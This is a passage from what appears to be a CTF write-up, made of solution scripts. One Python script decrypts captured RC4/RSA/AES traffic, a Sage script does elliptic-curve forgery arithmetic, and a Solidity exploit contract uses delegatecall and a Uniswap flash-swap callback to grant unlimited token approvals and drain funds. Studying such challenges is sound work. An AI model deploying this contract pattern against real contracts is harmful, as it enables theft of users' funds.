fe1ebd946f04dce9fc3f1c0eae893a70cc4f530e686e822646e50ce888fb250451269f3830b0d5420cafeb618144b46ed71bc1dbdbd5199294d8fecc3614e6975b0db04bb1baea9530f6dbb76fdfbb65055835782215cad6c28e221eef88ca6f23689c20466093a3344c348a6fcaf4f7f67b9619b8c4fccedb011ae538becca8a4abbd1d118584ec85f9283507b8e44c54321948ace46971d793a2031e2bf781a3c53681dc3bb22170c8290527cb5b389310c8653c6b8afaf95f6537ff83f2bb2b5ce13ec849b2d5dc497096e7bb90cb1535cfd17d5d771805721a6d9c0f34c6611a4dab477faa97b12f84f7d8124738b862bee00de4c9089896706c20e3b84e8ebd95b5044761b77f2ee0dc7647fe9a547a1cb643d185a96dc66f3eaea80aa238f9443d078746f32ffb7567ee6657dbe6c248a025c1c5f67c3ece3b5feca0d1b05df87f35eda83488e04a4f7d8f2648ae34dc8e5805e51635ad917f4400e1f1c4e47af9d726074c29d58c8560f2d424d4c2aebd31db481062fb2820e09dd61a034c04f787351b75b01e1f3a4406bd2b5f021eff607c8ff17ef82df18a3cf7bd9bddef686cdbaed54e530959fa5e4c701924c333cc99da6cb721d69addc97d4c8b496405cc3cd538821946770f54487f59c295460be7f541358e5bc6275b38ce58fe5f4ff9e577532c4734c66357c2b7892983626974c3bc78533d8fa8d7ac1deca6a78141ab2d472ec7951e76a0773928e6c2eece57339a4c3095025b6c6a558b4fd2aefd6e8962aa9f013cc0c49b3e4f5028b3cfab1993138f3e4914b3c2c92319260757f4abb6bbb93d77070c173fa58ee17dd60c58d4be6736822cfecbe9b5942b065fa9ed5cd98f040678c4ad1889e82a216d32f3292451dfc786c8dc9e103db34ca800a98d7a233089a3db47c80823171b523ded966b476d042ee450306c99c19e119e034977b47e1f5896dc32ac08679a9ccc7485f32b6a93b4810e715523448d5abb55d28719eff1111e8052db5e272b8edd047c6fea631943c0dd53ce2fbccccc762ef8fcf6b0c9ec00db22c2de742d63ffbef60ef88e37a494f94934b8927ab6a68b56c4039b50e59feeac46d1f4ff8c3941070e729510d27c799bfbf26cbd6c9751529079eafad444947c16f4274d71e9e0f4687734e28571af8b6498b7a34877dd131d240e1d187f527770c0086f9010249060794c188562d5e97254fc6814b747c412025199b1e36075d8a436e9be37abe6b2e1869f8beffdd9b641512605977f0abbb15c2104642af38f3898424594d5b9f735198983638311fb4b25e325a7887ff5d1765294a6114160f1d7bdfb5dfef1b872be3a75aca7557f75cbd2f241b2f7e3040dda41ffc38bd10b28304d1efd0bb2e2b045db8b2e8c71ce73d7d99d746857af1209a58968ce18b44a577aa4d05f05b05666c17f02ed09496aa9c78eeda68fea35f0fb7d14ffb21e26c3fd8a62feca0f50e851406bb227cb9e31233580d1ac6a8ef9e547f077da92b5535682a4217d160d58bc4cb363dbd24a3ebb471168875d89a43e0f6c9821a94d711017412064b8f509cc9511db369981f7e19d26e1ea265cbf181a8eb901b40ce6354e5e0747e4bfeba05ef3f1a22ee3861b1f250dcb0dc48d24287fc6d02b41b24482d7facb5405bc5b184bc5c34f127df9c383f06e430f2cdaa1aded3f3cb4bca95280f319c9bdc052e6b7ff74e69101eb1148ec716ae0eaae6c5d45fd126932a28ac1c2466797a6c27c53aac5777cccc5cbaa80e965db1646f2f63b91dd3cab2e26d4968610a18e3744c0e5568f9a97600f6e653f5df51cb97b1b233379b1aa938ffa4a0289cc6201916bf12a0e28630b0d33d1c9382ef0cf6e235139c7a1a9a628aec249fa06842ee4aa7e499e21e7e0c150e0b8ff7727c0b6ca3597191531927ac2974599575fe824244e4ff6d967abd6d2a3aed3ec1ac26ee19f423a7a08907eea2b6ca169a99be43324c1c7b187b659a6473d5088e19812b60c2e314c063e560e65b88c09fd880041fe9526597dc85e83254eb64c6b0ff3e45b87bc802799d1c01894889dd57b0fd2b0001b1f28b2d7e00940847081384d945d172152d69b31c44b5e0cf62dc85e90851be64dddd55aa659e8c405fbbdd4095d0b4b4540e56b7115c104ab903b877a4fc8fe83ef74f327f2228d6242638088f870b73c0a2feb3e272fd0feba7609d585af9a452988425a28d12a583306a178444ef5f4bbcf97ef93a0291199b0d9548277195c3914625db22a5a9edd1ec89ad334076e7b252727d7ccc2603cebafc70e48411a00c1725a9ad1dcf160dc1cb7c9caeaf35576b1f76029ff4fdc73b5f0c8e1fdd74a95ad6c214a9e0eca0ff5e01a4e86f5f3bb71f817bbf6af2ea29e8ee845250eee1ffae71417887f0c652827d3fb8329c988fec2b1a3f2c36a758bd2791929aa6bcf87a6dc910aa369a866c38734ee320fd57f4b7598fb1033fd4d81256b4a44ce6e0839276507fdb7c1b879938eb805756a046149bbfd555ccf7495456a0f23f3e2fd2395938c57936859a9d07e1df26d4c63b3183e839be4eca5300e9c8efecf50d9e928e9e63792d7faa72a58b859127fd16de31d3442be64fae1c3b8dabb0375f15a14cd1a3fc19445bf89126beba97c7493f39cc940069b329d401a8acca9d78871f5cf23bed267cc2585ca28a105f1d3df066c845250f2f36a428b3dce760981eaf1cee2a439f3dd63968612f629e545a0ebaffd0919121bb3c0fed4ba3cbf914343628afae23e43aaadb553cfd870ca957bbd83467fd858bebda0de890059b0b96b1def58bdba459aa21256aa3aa8c631968e7c2a79dcd2916ddd1222489e234bcf9d38c2366376616ff542286'))
i = 0
cou = 0
rsa_key0 = []
checksum0 = []
content0 = []
while 1:
    if x[i:i+4] == b'': break
    length = u32(x[i:i+4][::-1])
    i += 4
    if length == 8: # initialize packet
        i += 8
    elif length == 72 and cou != 2:  # rsa key exchange
        buf = b''
        cou += 1
        while length == 72 or length == 10:
            i += 8
            buf += x[i:i+length-8]
            i += length - 8
            if length == 10: break
            length = u32(x[i:i+4][::-1])
            i += 4
        rsa_key0.append(buf)
    elif length == 40:
        i += 8
        checksum0.append(x[i:i+length-8])
        i += length - 8
    else:
        i += 8
        content0.append(x[i:i+length-8])
        i += length - 8

# print(len(rsa_key0))
# print(len(checksum0))
# print(len(content0))
# print(rsa_key0)
# print(checksum0)
# print(content0)

cipher = ARC4.new(b'explorer')
x = cipher.decrypt(bytes.fromhex('612cb832389a79ecfb1cf1e6804a111a56e2315f03f2d3ed3a72edab5b9d27d39076f9f4c92ca4c0a2f3988e14367568be7e01d51d3061331adc5b5dff03a19f4c91df0c57342863124f387b03c88ae24f99ff9797d6e35819b2fc862e722294ebb30e1bea761b4a9167d3558a2f736677aef8b1de5dbad437824e98cb178e4281373cf6e54e69e5705c96d4788a784b2246bb552add44157d9d94ce7d9b8342a8254c3358b474e0cf747517bfa2f561b34746abb4276abb90dece2be4291441f1f389b5bf12ee5eacda891e524a96c3f28ab9126081852a2967e6b2d5ccd2b3a2f1e6375ccbde6214e1011744d65f87c67e59c4d994dfcc83501752c474f6cb334ad6522f287f1008be12ccfa7aae4bde26e9e0df5c23e17224a20647494e604776fff2434d49b3a6380dcbefc28892ca0f3cc00739a3c9e99b44362e95f747fbb7aeb58f11d22661d6b43a9ea40f5cd3921b657cf17f006061ba535ca827fae13c974cbf6b91405d8a6a6626946417f14a42197b5a0c6cb0ea27e707a2ff774e903bec7c0bf228261b7fc17e29f393e04d5a82dd878e7ce1cb06083f1255ad59a98d2f2b1a2400960ebe423b5411b66c52fb12950cfe804dba3322f917a84dee317f55afa16b933af12efe0bb4bb6374b44d17d3ac86db2c5fe964ac09155dd21c7d2ad24951420f56ead8ad35aa7edc24378cd51d174d20789fb1a4c42f495b0a9b76618653ce3f5372ed570f452d92f735e2ea8162282ad2896effa04a4c98e289daedf2cab767adcf0d09b002df14197bf0d6c48c2bfbd6183e1aac2b00aa298a072ebc07d0ccaba0d9973bb96e8e812e400be2edc37f9c0625e210fa314a42801d7b9edef0c573c44c77b190e436874bb2cdf257c9824bed624319010f52de5f47a5d7bb60420d7a38f8bed800fa6867ed7765a81e6ed2dc1e1b9f4c39938492786782b2d601002864544490ae43be76c691e6e5e6a7b2961793ce7e9eea68d8afdb36ca3e1abf91f40d9f7e3b3680eb2e9957102d9d5deb639f98969344a1334688e5af639e7b437bd466835ac2b2c730619a7424bec7674ed18709f94f5f5efbaeb9661255be06a3ead120174176c0f67bd58ae1df5f6a9f198434b4e3e603d65df3c75b83b81009fcab78806f6b1002a1e85ae7b2283c01a07e3537655d1098044998907d4ff66465e7be0dd76b53c680da3bcbac617ecd7f2a17535e4ffafe5bef647446695ea5cd0e3ab1a8f7d2a001d2e7a37815720d1027f3e5fc65c6441367d1e5bbe5869e442ed33cc4be076f730fcec9b8fe836637f23ef6f81577278f78d764ba4ce4f3b15bd09af9e839ec1e74f662b3dbd3e348427ad579167296e96d951d18d5ae30b5b708fcc3c6e3e588f68f2bda24efefcb94f45ddd7db905c669111ae0d40ce07d471b6290eef84aade1b8a18dc6627568b094135965a5d659d6050b25ec05fd15cad664deeed8d3c0491ea382b078fff324952323eaf8f49c41f2f0e0c392d7938a897d754e4f4638e79b5207608aa97bfba8bc06e21c224dfe5e874d5157e1ac6951fbb1417e43e090d9d9a1ece2ebc741a90a5d34072dd229466db106e4ba7f7cd0481fee97227765e4ed132b71899231872ff364e7f74148277dc6004f29acbca1d5ce59370171f4c3a1f8c92315f9fd36a44e4800b439a8dfe419ea2fd0c28ba6aa2626e9751c2a5b04b18faee2566f566d0a7bf567246ba974abe95215da620d6c8e01abb5f21cd91a1d747557e7ad1999c3879e286458242d47c7321355e940e0bd979077bf4bcbde57af8eaf64819442f46e3ecb162f61a494a0400559926bcde9ee933e442d54069113b2e82d07db493dffe59457a2ad5d81f310af06b9c73063e489e83e6e690eba9ca40cc010166d9e89a49e58b53c7cd3522fe9e05139b18862f7009b17bf3cbcd164a04b76f166c12621b9db7e5f5856613dd208c2baf4a939e015f2d443e9b7b23037b843937da5f5ddce44c966efe417d14f7d4ab599ae9b375b27daaf6b6c1abbfdf5c007e9fe1b317e96de1a660c685b4b4f18acb8def67ceb66318b5b2f9fb8009b95833c3725a0ad41c71c78655b67ffc23e9e1cb6279da4379e3be169ba9c8176723a5f7785e689bf94fb2bc372786feb16812492e40ad30e934c8e8d377f022d954d13213abaa9041e789b8d55dc112d4626c7f892ec4eda35480528af0ecaf0d95418ec58e6f4c8de0c0145a7afbdefe1ebc446f04dce9fc3f350dfac8271f883200c1de7f4e7f176c5dfa4a4105a7f878518cdaa480396e9a2a7e51416fd5a7f139f9c5ef3d54ff70d75e1431b0e60857e1d677f79c5487a5dac4d25d3250e5198fc2642fe3b814ddfed3e111fd13a0346b2db2d89aee370d3937db5f8a5802f4e0ba15746bfbcf36fc9cf305af6993059eec6dad467424963f989c8e5fdad28ce9a983c3c26502d0aedfff025a3b113aecc5faec7d0dfe9d55a8c43a6191aca49bde7e62a5adc18d5731cbf7ceb3b563252b5ad15615cbcbedff7d6fd439e4de86447a529da4bca06db6399a8a43feb05d26a9748e071be2091cbef40e90cf038823e4aae385692c1b3a28f5ec75f09cb31e57a75e56bec8fc8eba271a83718a103835eff63752c7793eeb92fbb3b49ab51c6c3d8d29eff6a914d606859ac7fe027ece0a20bf503054b9496467390dd1253e49d609f4557e223926d0f8d12190eb46af597980ca3f3e79a2c8b94779b7fde110bcbefff22201249d41ae056c12ad1688204c118eaf0a1a745d128279ce02516ea6c741afb126288d7ba5371f1f6e833b806f299562976d92efb42f990fd9d16bf281224c66d35526286839eb122903078029ecc7c7e23833a701d53a2344eace7c003738d9a67c0606f30c0457341c12b1063469112db89ccf2311db3479793e2429dd3611c93b9013de2b0e5615f4d0a26e83f3a7334d7ae7917520484326a5074c07fc091f59a5cc8824f59c8831ce97a97e3bde3c8b935f66255a0d9b943c1ab939c995bb81d26fffd63feb44408891c03865f7f7c88055e2725e96d988fffad242ec02ef36a73dcf217da7fa19b2547de3618999e876271a0cbae3b8b9258dd95a962778e0e8657bdc1aa9512d0677a81860756f19e72389b5a34e8afb38fd42fe76df36424f2379b32cfc2743b09feeb4139f934e1b9d6da10837375bfb0b717f4733b2f6045b7f52f28e174b97d6312faeceaa4b3add951e90dca757629626b466b479968ce9849a908062c5f1210bcd2baec9c70d8cba30afe3e18cbf4c6a91c8cd97548e677f23cec0ca29f5598f6f5287e6fdadee041e90b46de53b20eaa29befb21183f064914292d7b763d4b7303e3b15aee9416a3bf00f70414d2a6be3ddc0381ad44490dc16f427dd71e9e0caf7276bda41154afe95bb0b72c8478696ae2170b25489b358fbf40d41814b7da244faaa3fd5257c5bbb0654c30d4a3054bdd589c0c516a3e7ae0b6981376cabbe0df7f674e1ba7eb769f7e638007d0ec7c8af6dec07b86c286798996698f7c435b9f30de4e1435195c3531151d37d4fce842b086cd0759daa3a84ce51fe5b668bd667213ceec60d8bb87e8dfa36fc5fc468efc51914090a3673e0f0b0499ef98bb2f2b055dbab3eb47140abb6c825990a566a4d853faa074a9b7dfedbb48e12a57c7a8094c6c5555126e613c84c6c9c74de311cd1a4a683c1cc9719d8ed414029c9f8fcf766c466e2234b9ab1232580c1ac4ebae8b13ca10d24ce3e73483df83fa5f477ac602f6a85796b66627044888c6201c76c423c1977f7fba20a16969107ec52daea0195a7f4b28dc839239a4d015f488e1f1c9a8e1901a40cf63565a79bc01b251791482742c3040a24037c7552208e289cef63cf684a17559b8ccbb819cd28ba42496777fe372cab67b487eef4d1c1beadb3cc21fec221c29b3ea4baeea8a22d60a3b629cc06d330f3f9568434f35fa98605cd4adcc20ea96a4d57a61f0c575da38f022471a289ea53ae329381b1d1115f9cf3a9e461b1c114285ad2647db88ad227a73e050e7672cd1d8dd650a7f1e6a6a1ba34893d69b32a970ffa5a0299cc5c82d982611a5f79c366a6a525342f7f55819a0ec72ea3a510343319083956c249c5ae2f4ce48f22015dff078bebb30fd7974c74549c70addd0ceb9484fb5ee533d84f3b159a9819aaa824651c32e6105ab849ea88e870305a7b12f4a2af637a06b8ce6f112596c91695011e46153f28d0379509e8fa8288e19a9dbc2dac944a8f3e98d261b430895a1ee5c03c1ea9978b0f53e0db87ac803799fd98a89488bf5752258b9b68e6a0776cf6772b5ea70dd182ecbf9aa76471d19254d18f2edbd747fd7ad9ec925b43d84749e8c52f6584b963f4b21024fc17f47db2f02495ba28d075f6104b2e8c230b0365d2943edf612969397f9d9a0c414fa95fa9c46a9d2719d8752855eef7dfdf7a1e9fd49a1f90547cd1353d003862c2a84701c811ae3125be9f33945717263914625db22a5a9edd1ec89ad64dbcbb43949d8dd72b183411fc9cb0ccc468edbf55a253da57e56bc8d7999c7e6f9f2e7bd81fdc43a03ff7fa6e1a7a68b5c5cfe95cf14f4595d1ab2e12c41d7a4e86f5f3bb71f817bbf6af29e67eed71ea0377305d554be7f6fc564a31c046c6a15253692bb8983fe3358e91c814218db4445bd798d17fda7a28251def77affc21fb2e648eeb1a5168bb81a3fd4d81256b4a44ce6e083923fe387b6f38f157fa30a5e92f93c0a0669ac71b87eefa7473e522b6c2d7a766f7f2d73bb6b65d93bbf68154991c78b60df60cd68896a7bebe536b8d324a4f4a08e9e630d2d7faa72a58b85919b2e6200ae907d360282f60810b74c39640ad0284a29b79b5e7c88afcd874e50b7ae68865af01ac042a59156da18ada3329df85457145c64d0549ec00d0a72db15d4f5c3018588b72201ab9d4c7b2899cad096775679415331543705a77b0835c3c8f44f148223d08f122824851b13b092362308feffdeb4e9fd1a53a34ed5664c01aa5465ec9422f464b253d30d86ff059b0bbbb1def58962d88b402b06477c1936c396d6a20d553e627e1dbc451438fd6212d25d1490a01997fda0d9c31bf14d241ff26df64be47d06716362cc5c4d569fc24ef54fe9dcfb3d54b40aa6b4963848178728547e99ef4fa167e4b7d2501fbfdfbd48024ff79e37ee91a81b44b430ffc51d1dfa18947bc3723a94ff182a7ee724445bc1b213cdfb054b884ce8a09e9c470f9e8342b3e0ac91f49f1ebfc15c141f081ad56428f9fee34a056b6cde78960b5f168de599ff3f39e64ca92573fe02afdeaec876f4f59afcd454c66e3b762d26ce288ca343b1799fe7c3d99e4df645116242c7444e5c73e9b94cb765a11c58d60e5e254c10fb10acdca8c6f27dcbd19cd2b2205bf73aa88cc4939ef11b'))
i = 0
rsa_key1 = []
checksum1 = []
content1 = []
cou = 0
while 1:
    if x[i:i+4] == b'': break
    length = u32(x[i:i+4][::-1])
    i += 4
    if length == 8: # initialize packet
        i += 8
    elif length == 72 and cou != 2:  # rsa key exchange
        buf = b''
        cou += 1
        while length == 72 or length == 10:
            i += 8
            buf += x[i:i+length-8]
            i += length - 8
            if length == 10: break
            length = u32(x[i:i+4][::-1])
            i += 4
        rsa_key1.append(buf)
    elif length == 40:
        i += 8
        checksum1.append(x[i:i+length-8])
        i += length - 8
    else:
        i += 8
        content1.append(x[i:i+length-8])
        i += length - 8

rsa_key10 = b''
for i in range(21, 26):
    rsa_key10 += content1[i]
rsa_key11 = b''
for i in range(26, 31):
    rsa_key11 += content1[i]

rsa_key00 = b''
for i in range(24, 29):
    rsa_key00 += content0[i]
rsa_key01 = b''
for i in range(29, 34):
    rsa_key01 += content0[i]

aes_key = []
# for i in range(2):
rsa_encmsg = rsa_key00[2:]
x0 = rsa_client_decrypt(rsa_encmsg)
rsa_encmsg = rsa_key10[2:]
x1 = rsa_server_decrypt(rsa_encmsg)
rsa_encmsg = rsa_key01[2:]
x2 = rsa_client_decrypt(rsa_encmsg)
rsa_encmsg = rsa_key11[2:]
x3 = rsa_server_decrypt(rsa_encmsg)

aes_key.append(xor(x0, x1))
aes_key.append(xor(x2, x3))

x = b''
for i in range(36, 40):
    x += content0[i]

try:
    iv = x[4:4 + 16]
    enc = x[4 + 16:]
    ans = aes_decrypt(aes_key[1], iv, enc)
    unpad(ans, 16)
    print(ans)
except:
    try:
        iv = x[4:4 + 16]
        enc = x[4 + 16:]
        ans = aes_decrypt(aes_key[0], iv, enc)
        print(ans)
    except:
        pass
```



```
# sage
p = 21888242871839275222246405745257275088696311157297823662689037894645226208583

curve_order = 21888242871839275222246405745257275088548364400416034343698204186575808495617

a = 0
b = 3

E = EllipticCurve(GF(p), [0, 3])

# 输出复制到这里
u,v = ([(1, 2), (17594011244036726204148775053722298418355885678242330856042558443003416271358, 9864269454188687296916879203588081147069391802115909892998370853076735451088), (9582033761520609977067243276111765174780467007035657754108644309456311493412, 363082710746663210829953368012536103994697286891196104900121692862812378014), (4111129978068730876606719965689761842680095318196116780908148918092075611072, 11388292103436967067319015389479090136816684072615483483423851853417031328909), (15791952945347456581823691803265299443485440501444665496524420276400624045275, 18361160070966126304192203315535116416741869973218108943143343418823594134766), (20554731742852653423284025291647465423309460135828433189788883260208962559032, 5923425253966204552541211500537555656550465034919631380437890945702932097462), (1908105765070560338725700627238464267310513568390287634085550210004291696537, 17405316260124375494170658191199568328631207617895473455226857870436755737396)], [(9634894927939011348896355768859169210063455134929111433831297385479068366468, 18706704209312471648463268908349843193892042148771880665056881652483058677682), (13148083554881542368370385329805381103598980629800713224302792863789627802216, 2856293213988633205564182295926834666147944039356268015083515711649144957321), (14202151665385345693006926014620748851038130099881473622440144597252733104220, 21108174329955240774006013975070596161606617072479534235944174958548707636093), (19878512987113704124770750579916032464836816236119605579946357105623633546778, 18706916030044806095072230831913224917430037223323359738357805511683262571633), (2375835580706880147142215933820110173868735430945856445482901423796266462786, 2958305725183237892210833235538990402981827778100670244520151382554599440392), (19940271043433844146454721486594462228680503378590251986212990904445328136928, 17066962637827539033559101382545985449198363467361427626172173878295119604242), (20951864506589577158275286569085741343852480332645282939376008583000889823629, 14663822506177028598478223151045485085348064734341660362522571435055459631346)])

for i in range(len(u)):
    u[i] = E(u[i])

for i in range(len(v)):
    v[i] = E(v[i])

o1 = u[4] - 10 * u[3] + 35 * u[2] - 50 * u[1] + 24 * u[0]
o2 = v[4] - 10 * v[3] + 35 * v[2] - 50 * v[1] + 24 * v[0]
o3 = u[0]

# 复制这里的输出粘过去
print(o1.xy()[0], o1.xy()[1], end=" ")
print(o2.xy()[0], o2.xy()[1], end=" ")
print(o3.xy()[0], o3.xy()[1])
```



```
pragma solidity ^0.8.17;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./UniswapV2Pair.sol";

contract ExploitPrecompliecontract {
    address WETH;
    address Simpletoken;
    address beneficiary;
    UniswapV2Pair uniswap;

    constructor(
                address _WETH, 
                address _Simpletoken,
                address _beneficiary,
                address _uniswap)
          {
        WETH = _WETH;
        Simpletoken =_Simpletoken;
        beneficiary = _beneficiary;
        uniswap = UniswapV2Pair(_uniswap);
    }

    function stealLater() internal  {
        (bool WETHsuccess, ) = WETH.delegatecall(
            abi.encodeWithSignature(
                "approve(address,uint256)",
                beneficiary,
                (uint256)(int256(-1))
            )
        );

        require(WETHsuccess, "WETH approve failed");
        (bool Simpletokensuccess, ) = WETH.delegatecall(
            abi.encodeWithSignature(
                "transferAndCall(address,uint256,bytes)",
                Simpletoken,1,
                abi.encodeWithSignature("approve(address,uint256)",
                beneficiary,
                (uint256)(int256(-1)))
            )
        );
        require(Simpletokensuccess, "Simpletoken approve failed");
        IERC20(WETH).transfer(address(uniswap),10);
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        stealLater();
    }
    function steal() public{
          UniswapV2Pair.swap(0,10,address(this),"0x1C3C");//need 10^-17 WETH
    }
}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/8-1692151196.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/1-1692151196.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/10-1692151197.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/8-1692151198.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/4-1692151199.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/4-1692151199.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/1-1692151200.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/3-1692151200.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/8-1692151201.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/08/5-1692151201.png)